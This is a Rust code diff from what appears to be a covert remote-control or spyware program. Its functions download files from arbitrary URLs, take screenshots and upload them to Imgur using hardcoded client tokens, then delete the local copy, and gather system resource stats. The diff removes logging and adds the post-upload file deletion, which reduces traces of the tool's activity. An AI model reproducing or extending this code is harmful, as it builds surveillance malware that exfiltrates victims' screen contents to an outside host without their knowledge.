@@ -9,8 +9,6 @@ use std::io::Cursor;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 use std::process::Command;
-use std::thread;
-use std::time::Duration;
 #[cfg(target_os = "windows")]
 use wpkg_crypto::decode;
 #[cfg(target_os = "windows")]
@@ -20,27 +18,23 @@ use imgurs::ImgurClient;
 use rand::prelude::*;
 use screenshots::Screen;
 use systemstat::{saturating_sub_bytes, Platform, System};
-use tracing::*;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 const DETACHED_PROCESS: u32 = 0x00000008;
 
-pub async fn download_string(url: &str) -> anyhow::Result<String> {
-    Ok(reqwest::get(url).await?.text().await?)
+pub async fn download_string(url: &str) -> reqwest::Result<String> {
+    reqwest::get(url).await?.text().await
 }
 
 pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
     let resp = reqwest::get(url).await?;
+
     let mut out = File::create(path)?;
-
     let mut content = Cursor::new(resp.bytes().await?);
-    io::copy(&mut content, &mut out)?;
-    Ok(())
-}
 
-/// Show message box
-pub fn messagebox(_message: String) {
-    // tokio::spawn(async move { msgbox::create("", &message, IconType::Info) });
+    io::copy(&mut content, &mut out)?;
+
+    Ok(())
 }
 
 // pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
@@ -143,8 +137,7 @@ pub fn get_working_dir() -> anyhow::Result<String> {
 }
 
 pub fn screenshot() -> anyhow::Result<String> {
-    info!("Taking screenshot...");
-    let screens = Screen::all().ok_or_else(|| anyhow!("Can't take screenshot!"))?;
+    let screens = Screen::all().ok_or_else(|| anyhow!("Can't take ss!"))?;
 
     if screens.is_empty() {
         return Err(anyhow!("Screen is empty"));
@@ -154,12 +147,12 @@ pub fn screenshot() -> anyhow::Result<String> {
         .get(0)
         .context("Could not find screens")?
         .capture()
-        .context("Image is empty")?;
+        .context("empty img")?;
     let buffer = image.buffer();
 
     // Save the image.
     let mut rng = rand::thread_rng();
-    let save_path = format!("{}/image{}.png", get_working_dir()?, rng.gen::<i32>());
+    let save_path = format!("{}/img-{}.png", get_working_dir()?, rng.gen::<i32>());
     fs::write(&save_path, &buffer)?;
 
     Ok(save_path)
@@ -170,6 +163,10 @@ const TOKENS: &[&str] = &["037a0d9b9dc5ce6", "3e3ce0d7ac14d56"];
 pub async fn screenshot_url() -> anyhow::Result<String> {
     let path = screenshot()?;
     let info = ImgurClient::new(TOKENS[0]).upload_image(&path).await?;
+
+    tokio::spawn(async {
+        fs::remove_file(path).unwrap();
+    });
 
     Ok(info.data.link)
 }
@@ -186,37 +183,22 @@ pub fn stat() -> String {
     let mut swap_total = 0;
 
     // get cpu usage
-    match sys.cpu_load_aggregate() {
-        Ok(cpu) => {
-            thread::sleep(Duration::from_secs(1));
-            let cpu = cpu.done().unwrap();
-            cpu_usage = cpu.user * 100.0;
-        }
-        Err(x) => {
-            error!("CPU load: error: {}", x);
-        }
+    if let Ok(cpu) = sys.cpu_load_aggregate() {
+        //thread::sleep(Duration::from_secs(1));
+        let cpu = cpu.done().unwrap();
+        cpu_usage = cpu.user * 100.0;
     }
 
-    // get memory stats
-    match sys.memory() {
-        Ok(mem) => {
-            memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
-            memory_total = mem.total.as_u64();
-        }
-        Err(x) => {
-            error!("\nMemory: error: {}", x);
-        }
+    // get memory usage
+    if let Ok(mem) = sys.memory() {
+        memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
+        memory_total = mem.total.as_u64();
     }
 
-    // get swap stats
-    match sys.swap() {
-        Ok(swap) => {
-            swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
-            swap_total = swap.total.as_u64();
-        }
-        Err(x) => {
-            error!("\nMemory: error: {}", x);
-        }
+    // get swap usage
+    if let Ok(swap) = sys.swap() {
+        swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
+        swap_total = swap.total.as_u64();
     }
 
     // return stats
